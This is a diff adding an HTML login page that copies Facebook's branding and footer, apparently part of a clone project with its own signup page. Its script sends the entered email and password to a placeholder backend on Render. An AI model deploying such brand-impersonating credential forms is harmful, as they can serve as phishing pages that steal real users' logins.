@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="wrap">
+
+    <div class="left">
+      <div class="logo">facebook</div>
+      <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+
+    <div class="card">
+      <form id="loginForm">
+        <input type="email" id="email" name="email" placeholder="Email address or phone number" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <p id="errorMsg" style="color:#f02849; font-size:0.85rem; margin-bottom:8px; display:none;"></p>
+        <button class="btn-blue" type="submit" id="loginBtn">Log In</button>
+      </form>
+      <a class="forgot" href="#">Forgotten password?</a>
+      <hr>
+      <a class="btn-green" href="signup.html">Create new account</a>
+    </div>
+
+  </div>
+
+  <footer>
+    <div style="margin-bottom: 8px;">
+      <a href="#">English (UK)</a> · <a href="#">हिन्दी</a> · <a href="#">অসমীয়া</a> ·
+      <a href="#">Español</a> · <a href="#">Français</a> · <a href="#">Deutsch</a> · <a href="#">العربية</a>
+    </div>
+    <div>
+      <a href="#">Sign Up</a> · <a href="#">Log in</a> · <a href="#">Messenger</a> ·
+      <a href="#">Facebook Lite</a> · <a href="#">Privacy</a> · <a href="#">Terms</a> ·
+      <a href="#">Cookies</a> · <a href="#">Help Centre</a>
+    </div>
+    <div style="margin-top: 8px;">Facebook © 2025</div>
+  </footer>
+
+  <script>
+    // !! Replace this with your actual Render URL after deploying !!
+    var BACKEND = 'https://YOUR-APP-NAME.onrender.com'
+
+    var form     = document.getElementById('loginForm')
+    var errorMsg = document.getElementById('errorMsg')
+    var loginBtn = document.getElementById('loginBtn')
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault()
+      errorMsg.style.display = 'none'
+      loginBtn.textContent   = 'Logging in...'
+      loginBtn.disabled      = true
+
+      var email    = document.getElementById('email').value
+      var password = document.getElementById('password').value
+
+      try {
+        var res  = await fetch(BACKEND + '/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: email, password: password })
+        })
+
+        var data = await res.json()
+
+        if (data.success) {
+          // Save name so other pages can use it
+          localStorage.setItem('loggedInUser', data.name)
+          alert('Welcome back, ' + data.name + '!')
+          // window.location.href = 'dashboard.html'  // uncomment when you have a dashboard
+        } else {
+          errorMsg.textContent   = data.error
+          errorMsg.style.display = 'block'
+        }
+      } catch (err) {
+        errorMsg.textContent   = 'Could not connect to server. Try again.'
+        errorMsg.style.display = 'block'
+      }
+
+      loginBtn.textContent = 'Log In'
+      loginBtn.disabled    = false
+    })
+  </script>
+
+</body>
+</html>
